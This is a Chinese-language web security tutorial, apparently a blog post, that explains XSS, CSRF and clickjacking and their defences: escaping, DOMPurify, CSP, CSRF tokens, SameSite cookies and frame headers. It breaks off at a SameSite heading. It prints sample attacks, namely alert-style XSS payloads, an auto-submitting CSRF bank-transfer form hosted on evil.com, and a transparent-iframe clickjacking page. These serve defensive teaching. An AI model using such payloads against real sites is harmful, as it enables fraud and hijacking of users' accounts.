a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>前端安全这事，很多人觉得是后端的活，或者觉得自己的项目没那么重要不会被攻击。但现实是，XSS、CSRF 这些漏洞在野外太常见了，而且很多时候攻击者就是用自动化工具扫的，不挑项目大小。</p>
<p>这篇文章把前端常见的安全问题捋一遍，每个问题讲清楚原理、攻击方式和防护手段。</p>
<hr/>
<h2 data-id="heading-0">XSS：最常见的前端漏洞</h2>
<p>XSS（Cross-Site Scripting，跨站脚本攻击）的核心就是把恶意脚本注入到网页里，让浏览器把它当正常代码执行。攻击者可以偷 Cookie、劫持会话、钓鱼、甚至发起蠕虫攻击。</p>
<h3 data-id="heading-1">三种常见类型</h3>
<p>三种 XSS 的攻击链路长这样：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph 存储型XSS
        A1[攻击者提交恶意评论] --&gt; A2[恶意代码存入数据库]
        A2 --&gt; A3[用户访问页面]
        A3 --&gt; A4[服务器返回含恶意代码的页面]
        A4 --&gt; A5[浏览器执行恶意脚本]
    end

    subgraph 反射型XSS
        B1[攻击者构造恶意URL] --&gt; B2[诱导用户点击]
        B2 --&gt; B3[服务器将参数反射到页面]
        B3 --&gt; B4[浏览器执行恶意脚本]
    end

    subgraph DOM型XSS
        C1[攻击者构造恶意URL] --&gt; C2[诱导用户点击]
        C2 --&gt; C3[前端JS读取URL参数]
        C3 --&gt; C4[直接操作DOM插入恶意代码]
        C4 --&gt; C5[浏览器执行恶意脚本]
    end
</code></pre>
<p><strong>存储型 XSS</strong></p>
<p>恶意代码被存到数据库里，每次访问都会执行。比如论坛的评论功能，攻击者提交一条包含恶意脚本的评论，其他用户一看评论就中招。这种危害最大，影响所有访问该页面的用户。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 危险的写法</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderComment</span>(<span class="hljs-params">comment</span>) {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'comment'</span>).<span class="hljs-property">innerHTML</span> = comment.<span class="hljs-property">content</span>;
}
</code></pre>
<p><strong>反射型 XSS</strong></p>
<p>恶意代码在 URL 参数里，服务器把参数原样返回到页面。常见于搜索功能：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// URL: https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</span>

<span class="hljs-comment">// 服务器返回</span>
&lt;div&gt;搜索结果：&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">'XSS'</span>)&lt;<span class="hljs-regexp">/script&gt;&lt;/</span>div&gt;
</code></pre>
<p>攻击者需要诱导用户点击特定链接才能触发，但传播性很强，可以通过钓鱼邮件、社交媒体等方式大量散播。</p>
<p><strong>DOM 型 XSS</strong></p>
<p>纯前端的问题，不经过服务器。直接用 URL 参数操作 DOM：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// URL: https://example.com#&lt;img src=x onerror=alert('XSS')&gt;</span>

<span class="hljs-keyword">const</span> hash = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'output'</span>).<span class="hljs-property">innerHTML</span> = hash;  <span class="hljs-comment">// 中招了</span>
</code></pre>
<h3 data-id="heading-2">防御 XSS 的完整方案</h3>
<p><strong>1. 输出编码（根据上下文选择）</strong></p>
<p>不同位置需要不同的编码方式：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// HTML 上下文：转义 &amp; &lt; &gt; " '</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHtml</span>(<span class="hljs-params">str</span>) {
  <span class="hljs-keyword">const</span> map = {
    <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'&amp;amp;'</span>,
    <span class="hljs-string">'&lt;'</span>: <span class="hljs-string">'&amp;lt;'</span>,
    <span class="hljs-string">'&gt;'</span>: <span class="hljs-string">'&amp;gt;'</span>,
    <span class="hljs-string">'"'</span>: <span class="hljs-string">'&amp;quot;'</span>,
    <span class="hljs-string">"'"</span>: <span class="hljs-string">'&amp;#x27;'</span>
  };
  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&amp;&lt;&gt;"']/g</span>, <span class="hljs-function">(<span class="hljs-params">char</span>) =&gt;</span> map[char]);
}

<span class="hljs-comment">// URL 参数：使用 encodeURIComponent</span>
<span class="hljs-keyword">const</span> url = <span class="hljs-string">`https://example.com/search?q=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(userInput)}</span>`</span>;

<span class="hljs-comment">// JavaScript 字符串：使用 JSON.stringify 或 Unicode 编码</span>
<span class="hljs-keyword">const</span> safeStr = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(userInput);

<span class="hljs-comment">// CSS 上下文：转义特殊字符或禁止用户输入影响样式</span>
<span class="hljs-comment">// 最好别让用户输入直接影响 CSS</span>
</code></pre>
<p>实际使用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用</span>
element.<span class="hljs-property">innerHTML</span> = escapeHtml(userInput);
</code></pre>
<p><strong>2. 使用安全的 API</strong></p>
<p>不要用 <code>innerHTML</code>，用 <code>textContent</code> 或 <code>innerText</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 危险</span>
element.<span class="hljs-property">innerHTML</span> = userInput;

<span class="hljs-comment">// 安全</span>
element.<span class="hljs-property">textContent</span> = userInput;

<span class="hljs-comment">// Vue/React 里也一样</span>
<span class="hljs-comment">// 危险：&lt;div v-html="userInput"&gt;&lt;/div&gt;</span>
<span class="hljs-comment">// 安全：&lt;div&gt;{{ userInput }}&lt;/div&gt;</span>
</code></pre>
<p>现代框架（React、Vue、Angular）默认会做转义，但要注意"逃生舱口"：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// React - 危险的 API</span>
&lt;div dangerouslySetInnerHTML={{ <span class="hljs-attr">__html</span>: userContent }} /&gt;

<span class="hljs-comment">// Vue - 危险的指令</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">"userContent"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>

<span class="hljs-comment">// Angular - 危险的方式</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> [<span class="hljs-attr">innerHTML</span>]=<span class="hljs-string">"userContent"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>

<span class="hljs-comment">// 这些地方需要手动净化</span>
</code></pre>
<p><strong>3. HTML 净化库</strong></p>
<p>如果必须渲染富文本（比如博客、论坛的富文本编辑器），用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcure53%2FDOMPurify" target="_blank" title="https://github.com/cure53/DOMPurify" ref="nofollow noopener noreferrer">DOMPurify</a> 清理：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">DOMPurify</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'dompurify'</span>;

<span class="hljs-keyword">const</span> dirty = <span class="hljs-string">'&lt;img src=x onerror=alert("XSS")&gt;'</span>;
<span class="hljs-keyword">const</span> clean = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(dirty);
element.<span class="hljs-property">innerHTML</span> = clean;  <span class="hljs-comment">// 安全</span>

<span class="hljs-comment">// 配置允许的标签和属性</span>
<span class="hljs-keyword">const</span> clean2 = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(dirty, {
  <span class="hljs-attr">ALLOWED_TAGS</span>: [<span class="hljs-string">'p'</span>, <span class="hljs-string">'strong'</span>, <span class="hljs-string">'em'</span>, <span class="hljs-string">'a'</span>],
  <span class="hljs-attr">ALLOWED_ATTR</span>: [<span class="hljs-string">'href'</span>, <span class="hljs-string">'title'</span>]
});
</code></pre>
<p>DOMPurify 会移除所有潜在危险的标签和属性（<code>&lt;script&gt;</code>、<code>onerror</code>、<code>javascript:</code> 等），同时保留合法的 HTML 结构。</p>
<p><strong>4. HttpOnly Cookie</strong></p>
<p>设置 Cookie 时加上 <code>HttpOnly</code>，JavaScript 就读不到，XSS 攻击也偷不走：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端设置</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'sessionId'</span>, <span class="hljs-string">'xxx'</span>, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// JavaScript 访问不到</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// 只在 HTTPS 下发送</span>
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span> <span class="hljs-comment">// 跨站请求不发送</span>
});
</code></pre>
<p><strong>5. Content Security Policy (CSP)</strong></p>
<p>CSP 是浏览器级别的防护，通过 HTTP 响应头限制页面能加载哪些资源。设置好 CSP，即使有 XSS 漏洞，攻击者也很难利用。</p>
<p>通过 HTTP 响应头设置：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">Content</span>-Security-Policy: default-src <span class="hljs-string">'self'</span>; script-<span class="hljs-attribute">src</span> 'self' 'nonce-abc123'; style-<span class="hljs-attribute">src</span> 'self' 'unsafe-inline'; <span class="hljs-selector-tag">img</span>-<span class="hljs-attribute">src</span> *; <span class="hljs-selector-tag">object</span>-<span class="hljs-attribute">src</span> '<span class="hljs-attribute">none</span>'
</code></pre>
<p>或者用 meta 标签：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Security-Policy"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"default-src 'self'; script-src 'self' https://trusted.com"</span>&gt;</span>
</code></pre>
<p>这个策略的意思是：</p>
<ul>
<li><code>default-src 'self'</code>：默认只能加载同源资源</li>
<li><code>script-src 'self' 'nonce-abc123'</code>：脚本只能来自同源或带有特定 nonce 的内联脚本</li>
<li><code>object-src 'none'</code>：禁止 <code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code> 标签</li>
</ul>
<p><strong>CSP 指令详解</strong></p>
<pre><code class="hljs language-perl" lang="perl">Content-Security-Policy:
  default-src <span class="hljs-string">'none'</span>;                                 <span class="hljs-comment"># 默认禁止所有</span>
  script-src <span class="hljs-string">'self'</span> <span class="hljs-string">'nonce-randomvalue'</span> https:<span class="hljs-regexp">//</span>cdn.example.com;  <span class="hljs-comment"># 脚本来源</span>
  style-src <span class="hljs-string">'self'</span> <span class="hljs-string">'nonce-randomvalue'</span>;               <span class="hljs-comment"># 样式来源</span>
  img-src <span class="hljs-string">'self'</span> data: https:;                        <span class="hljs-comment"># 图片来源</span>
  font-src <span class="hljs-string">'self'</span> https:<span class="hljs-regexp">//</span>fonts.gstatic.com;          <span class="hljs-comment"># 字体来源</span>
  <span class="hljs-keyword">connect</span>-src <span class="hljs-string">'self'</span>;                                 <span class="hljs-comment"># Ajax/WebSocket 连接</span>
  frame-ancestors <span class="hljs-string">'none'</span>;                             <span class="hljs-comment"># 防止被嵌入 iframe</span>
  base-uri <span class="hljs-string">'self'</span>;                                    <span class="hljs-comment"># 限制 &lt;base&gt; 标签</span>
  form-action <span class="hljs-string">'self'</span>;                                 <span class="hljs-comment"># 表单提交地址</span>
</code></pre>
<p>关键点：</p>
<ul>
<li>避免使用 <code>'unsafe-inline'</code> 和 <code>'unsafe-eval'</code>，它们会削弱 CSP 保护</li>
<li>用 <code>nonce</code> 或 <code>hash</code> 代替 <code>unsafe-inline</code></li>
<li><code>frame-ancestors</code> 防止点击劫持</li>
<li>配置 <code>report-uri</code> 收集违规报告</li>
</ul>
<p><strong>nonce 的正确用法</strong></p>
<p>服务器为每个请求生成随机 nonce，内联脚本必须匹配：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 服务器每次请求生成新的 nonce --&gt;</span>
<span class="hljs-comment">&lt;!-- 响应头 --&gt;</span>
Content-Security-Policy: script-src 'nonce-abc123'

<span class="hljs-comment">&lt;!-- HTML --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"abc123"</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Allowed'</span>);  <span class="hljs-comment">// 这个脚本可以执行</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Blocked'</span>);  <span class="hljs-comment">// 攻击者注入的脚本，没有 nonce，被拦截</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>后端生成 nonce 的示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Express 中间件</span>
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// 每次请求生成新的 nonce</span>
  res.<span class="hljs-property">locals</span>.<span class="hljs-property">nonce</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">'base64'</span>);
  res.<span class="hljs-title function_">setHeader</span>(
    <span class="hljs-string">'Content-Security-Policy'</span>,
    <span class="hljs-string">`script-src 'nonce-<span class="hljs-subst">${res.locals.nonce}</span>'`</span>
  );
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p><strong>Report-Only 模式</strong></p>
<p>先用 <code>Content-Security-Policy-Report-Only</code> 测试，不会真的阻止资源，只是上报违规：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">Content</span>-Security-Policy-Report-Only: default-src <span class="hljs-string">'self'</span>; report-uri /csp-report
</code></pre>
<p>看看有哪些资源违规，调整策略后再正式启用。</p>
<hr/>
<h2 data-id="heading-3">CSRF：借刀杀人</h2>
<p>CSRF（Cross-Site Request Forgery，跨站请求伪造）的原理是：用户登录了 A 网站，Cookie 里有会话信息。用户访问恶意网站 B，B 网站向 A 发请求，浏览器会自动带上 A 的 Cookie，A 网站以为是用户本人的操作。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant 用户
    participant 银行网站
    participant 恶意网站

    用户-&gt;&gt;银行网站: 1. 登录银行网站
    银行网站-&gt;&gt;用户: 2. 返回会话Cookie
    用户-&gt;&gt;恶意网站: 3. 访问恶意网站
    恶意网站-&gt;&gt;用户: 4. 页面包含隐藏请求
    用户-&gt;&gt;银行网站: 5. 浏览器自动发送请求(带Cookie)
    银行网站-&gt;&gt;银行网站: 6. 验证Cookie有效，执行转账
    Note over 用户: 用户完全不知情
</code></pre>
<h3 data-id="heading-4">攻击示例</h3>
<p>用户登录了银行网站 <code>bank.com</code>，Cookie 还有效。这时候访问了恶意网站 <code>evil.com</code>，恶意网站里有这样一段代码：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 方式1：隐藏图片 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://bank.com/transfer?to=attacker&amp;amount=1000"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 方式2：自动提交表单 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://bank.com/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"evilForm"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"attacker"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"10000"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'evilForm'</span>).<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>浏览器会自动带上 <code>bank.com</code> 的 Cookie 发请求，钱就转走了。用户完全不知情。</p>
<h3 data-id="heading-5">防御 CSRF 的完整方案</h3>
<p><strong>1. CSRF Token（最可靠）</strong></p>
<p>服务器生成一个随机 token，存在 session 里，同时放到页面的隐藏字段或请求头中。提交时验证 token 是否匹配。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 前端从页面获取 token</span>
<span class="hljs-keyword">const</span> csrfToken = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'meta[name="csrf-token"]'</span>).<span class="hljs-property">content</span>;

<span class="hljs-comment">// 方式1：放在请求头</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/transfer'</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'X-CSRF-Token'</span>: csrfToken,
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
  },
  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">to</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">amount</span>: <span class="hljs-number">100</span> })
});

<span class="hljs-comment">// 方式2：放在表单隐藏字段</span>
<span class="hljs-comment">// &lt;input type="hidden" name="_csrf" value="token-from-server"&gt;</span>
</code></pre>
<p>后端验证：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Express 示例</span>
<span class="hljs-keyword">const</span> csrf = <span class="hljs-built_in">require</span>(<span class="hljs-string">'csurf'</span>);
<span class="hljs-keyword">const</span> csrfProtection = <span class="hljs-title function_">csrf</span>({ <span class="hljs-attr">cookie</span>: <span class="hljs-literal">true</span> });

app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/transfer'</span>, csrfProtection, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// token 验证通过才会到这里</span>
  <span class="hljs-comment">// 执行转账逻辑</span>
});
</code></pre>
<p>攻击者没法获取这个 token（跨域拿不到页面内容），伪造的请求就会失败。</p>
<p><strong>2. SameSite Cookie（现代浏览器默认防护）</strong></p>
<p>Cookie 加上 <code>SameSite</code> 属性，跨站请求就不会带 Cookie：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端设置</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'sessionId'</span>, <span class="hljs-string">'xxx'</span>, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>  <span class="hljs-comment">// 或者 'lax'</span>
});
</code></pre>
<p>三个值的区别：</p>
<ul>
<li><code>Strict</code>：跨站请求完全不发送 Cookie，最安全但可能影响用户体验（从外部链接点进来也没 Cookie，需要重新登录）</li>
<li><code>Lax</code>：GET 请求的顶级导航可以发送（比如点链接），POST 不发送。大多数场景够用，Chrome 80 之后的默认值</li>
<li><code>None</code>：都发送，但必须配合 <code>Secure</code>（仅 HTTPS）</li>
</ul>
<p>实际效果：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 用户在 bank.com 登录，Cookie 设置为 SameSite=Strict</span>

<span class="hljs-comment">// 场景1：从外部链接（evil.com）点击跳转到 bank.com</span>
<span class="hljs-comment">// 结果：Cookie 不会发送，用户需要重新登录</span>

<span class="hljs-comment">// 场景2：evil.com 的脚本发起对 bank.com 的请求</span>
<span class="hljs-comment">// 结果：Cookie 不会发送，请求失败</span>

<span class="hljs-comment">// 场景3：bank.com 内部的链接跳转</span>
<span class="hljs-comment">// 结果：Cookie 正常发送</span>
</code></pre>
<p>Chrome 从 2020 年开始，没设置 SameSite 的 Cookie 默认当作 <code>Lax</code> 处理，大大提升了安全性。</p>
<p><strong>3. 验证 Origin/Referer 头</strong></p>
<p>检查请求的 <code>Origin</code> 或 <code>Referer</code> 头，拒绝来自其他域的请求：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 后端验证</span>
<span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span> || req.<span class="hljs-property">headers</span>.<span class="hljs-property">referer</span>;

<span class="hljs-keyword">if</span> (!origin || !origin.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'https://yoursite.com'</span>)) {
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">'Forbidden'</span>);
}
</code></pre>
<p>但这个方法有局限性：</p>
<ul>
<li>某些情况下这两个头可能不存在（隐私设置、代理）</li>
<li>可以作为额外防护层，但不应单独依赖</li>
</ul>
<p><strong>4. 双重 Cookie 验证</strong></p>
<p>将 token 同时存在 Cookie 和请求参数中，服务器比对两者是否一致：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 登录时设置</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'csrf_token'</span>, token);

<span class="hljs-comment">// 前端发请求时，从 cookie 读取 token 并放到请求头</span>
<span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'csrf_token='</span>)[<span class="hljs-number">1</span>];
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/action'</span>, {
  <span class="hljs-attr">headers</span>: { <span class="hljs-string">'X-CSRF-Token'</span>: token }
});

<span class="hljs-comment">// 后端验证</span>
<span class="hljs-keyword">const</span> cookieToken = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">csrf_token</span>;
<span class="hljs-keyword">const</span> headerToken = req.<span class="hljs-property">headers</span>[<span class="hljs-string">'x-csrf-token'</span>];
<span class="hljs-keyword">if</span> (cookieToken !== headerToken) {
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">'CSRF token mismatch'</span>);
}
</code></pre>
<p>攻击者的跨站请求虽然能自动带上 Cookie，但无法读取 Cookie 内容，也就拿不到 token 放到请求头里。</p>
<hr/>
<h2 data-id="heading-6">点击劫持：障眼法</h2>
<p>点击劫持（Clickjacking）是把目标网站用透明 iframe 嵌入到攻击者网站，用户以为在点攻击者的页面，实际点的是 iframe 里的目标网站。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph 攻击者页面
        A[假按钮: 领取优惠券]
        B[透明iframe: 银行转账页面]
    end

    C[用户] --&gt;|点击假按钮| A
    A -.-&gt;|实际触发| B
    B --&gt;|执行| D[银行转账操作]
</code></pre>
<h3 data-id="heading-7">攻击场景</h3>
<p>攻击者页面上放了个"领取优惠券"按钮，但按钮下面是透明的 iframe，iframe 里加载的是银行网站的转账确认按钮：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 攻击者页面 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-tag">iframe</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.01</span>;  <span class="hljs-comment">/* 几乎透明 */</span>
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">9999</span>;
  }
  <span class="hljs-selector-class">.fake-button</span> {
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">left</span>: <span class="hljs-number">100px</span>;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://bank.com/transfer"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fake-button"</span>&gt;</span>领取优惠券<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<p>用户点"领取优惠券"，实际触发了 iframe 里银行网站的转账确认按钮。</p>
<h3 data-id="heading-8">防护手段</h3>
<p><strong>1. X-Frame-Options 头</strong></p>
<p>最简单有效的方法：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">X-Frame-Options:</span> <span class="hljs-string">DENY</span>        <span class="hljs-comment"># 完全禁止被 iframe 嵌入</span>
<span class="hljs-attr">X-Frame-Options:</span> <span class="hljs-string">SAMEORIGIN</span>  <span class="hljs-comment"># 只允许同源嵌入</span>
</code></pre>
<p>Nginx 配置：</p>
<pre><code class="hljs language-nginx" lang="nginx">add_header X-Frame-Options "SAMEORIGIN" always;
</code></pre>
<p><strong>2. CSP frame-ancestors（推荐）</strong></p>
<p>更现代的方案，功能更强大：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-attribute">Content-Security-Policy</span>: frame-ancestors <span class="hljs-string">'self'</span> <span class="hljs-attribute">https</span>:<span class="hljs-comment">//trusted.com</span>
</code></pre>
<p>可以指定多个允许的域名，比 X-Frame-Options 灵活：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 只允许同源</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'self'</span>

<span class="hljs-comment"># 允许多个信任域名</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'self'</span> https://trusted1.com https://trusted2.com

<span class="hljs-comment"># 完全禁止</span>
Content-Security-Policy: frame-ancestors <span class="hljs-string">'none'</span>
</code></pre>
<p><strong>3. SameSite Cookie</strong></p>
